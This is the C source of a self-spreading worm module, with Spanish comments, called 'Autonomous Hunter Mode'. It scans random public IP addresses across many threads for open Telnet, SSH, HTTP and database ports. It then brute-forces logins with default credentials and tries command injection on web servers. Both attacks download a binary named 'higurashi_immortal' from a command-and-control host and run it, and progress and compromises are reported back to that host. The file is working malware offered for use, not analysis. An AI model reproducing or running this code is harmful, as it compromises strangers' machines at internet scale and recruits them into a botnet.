// Autonomous Hunter Mode - Mass Internet Scanner
// Busca víctimas vulnerables en rangos IP aleatorios y ataca automáticamente

#ifndef AUTONOMOUS_HUNTER_H
#define AUTONOMOUS_HUNTER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <arpa/inet.h>

// Configuración del hunter
#define HUNTER_THREADS 50           // Threads concurrentes de escaneo
#define TARGETS_PER_ROUND 5000      // IPs a escanear por ronda
#define SCAN_TIMEOUT_MS 2000        // Timeout por puerto (2s)
#define ATTACK_DELAY_MS 100         // Delay entre ataques (anti-flood)

// Forward declarations
void *hunter_stats_reporter(void *arg);

// Puertos vulnerables comunes
int hunter_ports[] = {
    23,    // Telnet
    2323,  // Telnet alternativo
    80,    // HTTP
    8080,  // HTTP alternativo
    8081,  // HTTP alternativo
    443,   // HTTPS
    22,    // SSH
    21,    // FTP
    3306,  // MySQL
    5432,  // PostgreSQL
    6379,  // Redis
    9200,  // Elasticsearch
    27017, // MongoDB
    0      // Sentinel
};

// Estructura de target encontrado
typedef struct {
    char ip[16];
    int port;
    char service[32];
    int exploitable;
} HunterTarget;

// Estadísticas del hunter
typedef struct {
    unsigned long ips_scanned;
    unsigned long ports_checked;
    unsigned long hosts_found;
    unsigned long exploits_attempted;
    unsigned long successful_compromises;
    time_t started_at;
} HunterStats;

HunterStats hunter_stats = {0};
pthread_mutex_t hunter_mutex = PTHREAD_MUTEX_INITIALIZER;

// ============================================================================
// GENERACIÓN DE RANGOS IP ALEATORIOS
// ============================================================================

// Genera IP pública aleatoria (evita rangos privados y reservados)
void generate_random_public_ip(char *ip_out) {
    unsigned char octets[4];
    
    do {
        octets[0] = (rand() % 223) + 1;  // 1-223 (evita 0, 224-255)
        octets[1] = rand() % 256;
        octets[2] = rand() % 256;
        octets[3] = (rand() % 254) + 1;  // 1-254 (evita .0 y .255)
        
    } while (
        // Evita rangos privados
        (octets[0] == 10) ||                                    // 10.0.0.0/8
        (octets[0] == 172 && octets[1] >= 16 && octets[1] <= 31) || // 172.16.0.0/12
        (octets[0] == 192 && octets[1] == 168) ||               // 192.168.0.0/16
        (octets[0] == 127) ||                                   // 127.0.0.0/8 (loopback)
        (octets[0] == 169 && octets[1] == 254) ||               // 169.254.0.0/16 (link-local)
        (octets[0] >= 224)                                      // 224.0.0.0+ (multicast/reserved)
    );
    
    snprintf(ip_out, 16, "%d.%d.%d.%d", octets[0], octets[1], octets[2], octets[3]);
}

// ============================================================================
// FAST PORT SCANNER
// ============================================================================

// Escanea un puerto con timeout (non-blocking)
int fast_port_check(const char *ip, int port, int timeout_ms) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 0;
    
    // Non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    
    // Wait for connection with timeout
    fd_set fdset;
    FD_ZERO(&fdset);
    FD_SET(sock, &fdset);
    
    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    
    int result = 0;
    if (select(sock + 1, NULL, &fdset, NULL, &tv) > 0) {
        int so_error;
        socklen_t len = sizeof(so_error);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
        if (so_error == 0) result = 1;
    }
    
    close(sock);
    return result;
}

// Identifica servicio por banner
void identify_service(const char *ip, int port, char *service_out) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        strcpy(service_out, "unknown");
        return;
    }
    
    struct timeval tv = {.tv_sec = 2, .tv_usec = 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        strcpy(service_out, "unknown");
        return;
    }
    
    char banner[256] = {0};
    recv(sock, banner, sizeof(banner) - 1, 0);
    close(sock);
    
    // Detectar servicio por banner
    if (strstr(banner, "SSH")) strcpy(service_out, "ssh");
    else if (strstr(banner, "FTP")) strcpy(service_out, "ftp");
    else if (strstr(banner, "HTTP")) strcpy(service_out, "http");
    else if (strstr(banner, "Telnet") || strstr(banner, "login:")) strcpy(service_out, "telnet");
    else if (strstr(banner, "MySQL")) strcpy(service_out, "mysql");
    else if (strstr(banner, "Redis")) strcpy(service_out, "redis");
    else if (port == 23 || port == 2323) strcpy(service_out, "telnet");
    else if (port == 80 || port == 8080) strcpy(service_out, "http");
    else if (port == 443) strcpy(service_out, "https");
    else strcpy(service_out, "unknown");
}

// ============================================================================
// AUTO-EXPLOITATION ENGINE
// ============================================================================

// Intenta explotar un target encontrado
int auto_exploit_target(HunterTarget *target) {
    pthread_mutex_lock(&hunter_mutex);
    hunter_stats.exploits_attempted++;
    pthread_mutex_unlock(&hunter_mutex);
    
    int success = 0;
    
    // Reportar hallazgo
    char find_report[512];
    snprintf(find_report, sizeof(find_report), 
        "{\"type\":\"hunter_found\",\"target\":\"%s:%d (%s)\"}", 
        target->ip, target->port, target->service);
    send_report("hunter_found", find_report);
    
    // EXPLOTACIÓN AUTOMÁTICA ACTIVADA
    char exploit_cmd[1024];
    
    // Telnet/SSH: Brute force con credenciales comunes
    if (strcmp(target->service, "telnet") == 0 || strcmp(target->service, "ssh") == 0) {
        const char *creds[][2] = {
            {"root", "root"}, {"admin", "admin"}, {"root", "admin"},
            {"admin", "password"}, {"root", "12345"}, {"user", "user"},
            {"root", "toor"}, {"admin", "1234"}, {"root", ""}, 
            {"admin", ""}, {"pi", "raspberry"}, {"ubnt", "ubnt"}
        };
        
        for (int i = 0; i < 12; i++) {
            snprintf(exploit_cmd, sizeof(exploit_cmd),
                "sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 %s@%s "
                "'cd /tmp; wget http://%s:8080/higurashi_immortal -O .h; chmod +x .h; ./.h &' 2>/dev/null",
                creds[i][1], creds[i][0], target->ip, C2_HOST);
            
            if (system(exploit_cmd) == 0) {
                success = 1;
                break;
            }
        }
    }
    // HTTP/HTTPS: RCE attempts
    else if (strcmp(target->service, "http") == 0 || strcmp(target->service, "https") == 0) {
        // Command injection común
        snprintf(exploit_cmd, sizeof(exploit_cmd),
            "curl -m 5 'http://%s:%d/?cmd=wget%%20http://%s:8080/higurashi_immortal%%20-O%%20/tmp/.h%%26chmod%%20+x%%20/tmp/.h%%26/tmp/.h' 2>/dev/null",
            target->ip, target->port, C2_HOST);
        system(exploit_cmd);
    }
    
    /*
    // Telnet: brute force con credenciales
    if (strcmp(target->service, "telnet") == 0) {
        success = telnet_brute_with_creds(target->ip, target->port, default_creds, default_cred_count);
    }
    // SSH: brute force
    else if (strcmp(target->service, "ssh") == 0) {
        success = exploit_ssh_with_creds(target->ip, target->port, default_creds, default_cred_count);
    }
    // HTTP: probar CVE exploits
    else if (strcmp(target->service, "http") || strcmp(target->service, "https") == 0) {
        success = execute_exploit_cve(target->ip, &exploits[i]);
    }
    */
    
    if (success) {
        pthread_mutex_lock(&hunter_mutex);
        hunter_stats.successful_compromises++;
        pthread_mutex_unlock(&hunter_mutex);
        
        // Reportar compromiso exitoso
        char report[256];
        snprintf(report, sizeof(report), 
            "🎯 COMPROMISED: %s:%d (%s)", 
            target->ip, target->port, target->service);
        send_report("hunter_success", report);
    }
    
    usleep(ATTACK_DELAY_MS * 1000);
    return success;
}

// ============================================================================
// SCANNER THREAD
// ============================================================================

void *hunter_scanner_thread(void *arg) {
    (void)arg;
    
    char ip[16];
    HunterTarget target;
    int batch_count = 0;
    
    while (1) {
        // Genera IP aleatoria
        generate_random_public_ip(ip);
        
        pthread_mutex_lock(&hunter_mutex);
        hunter_stats.ips_scanned++;
        batch_count++;
        pthread_mutex_unlock(&hunter_mutex);
        
        // Reportar progreso cada 50 IPs
        if (batch_count >= 50) {
            char progress[128];
            snprintf(progress, sizeof(progress), 
                "{\"type\":\"hunter_scan\",\"scanned\":%d}", batch_count);
            send_report("hunter_scan", progress);
            batch_count = 0;
        }
        
        // Escanea puertos vulnerables
        for (int i = 0; hunter_ports[i] != 0; i++) {
            int port = hunter_ports[i];
            
            pthread_mutex_lock(&hunter_mutex);
            hunter_stats.ports_checked++;
            pthread_mutex_unlock(&hunter_mutex);
            
            // Fast check
            if (fast_port_check(ip, port, SCAN_TIMEOUT_MS)) {
                // Puerto abierto, identificar servicio
                strcpy(target.ip, ip);
                target.port = port;
                identify_service(ip, port, target.service);
                target.exploitable = 1;
                
                pthread_mutex_lock(&hunter_mutex);
                hunter_stats.hosts_found++;
                pthread_mutex_unlock(&hunter_mutex);
                
                // Reportar hallazgo
                char report[256];
                snprintf(report, sizeof(report), 
                    "{\"type\":\"hunter_found\",\"target\"\"%s:%d (%s)\"}", 
                    target.ip, target.port, target.service);
                send_report("hunter_found", report);
                
                // Intentar explotar
                auto_exploit_target(&target);
            }
        }
    }
    
    return NULL;
}

// ============================================================================
// HUNTER MANAGER
// ============================================================================

// Inicia el modo hunter autónomo
void start_autonomous_hunter() {
    printf("🎯 Starting Autonomous Hunter Mode...\n");
    printf("   Threads: %d\n", HUNTER_THREADS);
    printf("   Target ports: ");
    for (int i = 0; hunter_ports[i] != 0; i++) {
        printf("%d ", hunter_ports[i]);
    }
    printf("\n\n");
    
    hunter_stats.started_at = time(NULL);
    srand(time(NULL) ^ getpid());
    
    // Crear threads de escaneo
    pthread_t threads[HUNTER_THREADS];
    for (int i = 0; i < HUNTER_THREADS; i++) {
        pthread_create(&threads[i], NULL, hunter_scanner_thread, NULL);
        pthread_detach(threads[i]);
        usleep(50000); // 50ms delay entre thread spawns
    }
    
    // Thread de estadísticas
    pthread_t stats_thread;
    pthread_create(&stats_thread, NULL, hunter_stats_reporter, NULL);
    pthread_detach(stats_thread);
}

// Thread que reporta estadísticas cada 5 minutos
void *hunter_stats_reporter(void *arg) {
    (void)arg;
    
    while (1) {
        sleep(300); // 5 minutos
        
        pthread_mutex_lock(&hunter_mutex);
        
        time_t uptime = time(NULL) - hunter_stats.started_at;
        double ips_per_sec = (double)hunter_stats.ips_scanned / uptime;
        double success_rate = (hunter_stats.exploits_attempted > 0) 
            ? (double)hunter_stats.successful_compromises / hunter_stats.exploits_attempted * 100.0
            : 0.0;
        
        char report[512];
        snprintf(report, sizeof(report),
            "📊 HUNTER STATS:\n"
            "  Uptime: %ldh %ldm\n"
            "  IPs Scanned: %lu (%.1f/s)\n"
            "  Ports Checked: %lu\n"
            "  Hosts Found: %lu\n"
            "  Exploits Tried: %lu\n"
            "  Compromised: %lu (%.1f%% success)\n",
            uptime / 3600, (uptime % 3600) / 60,
            hunter_stats.ips_scanned, ips_per_sec,
            hunter_stats.ports_checked,
            hunter_stats.hosts_found,
            hunter_stats.exploits_attempted,
            hunter_stats.successful_compromises, success_rate
        );
        
        pthread_mutex_unlock(&hunter_mutex);
        
        send_report("hunter_stats", report);
    }
    
    return NULL;
}

#endif // AUTONOMOUS_HUNTER_H
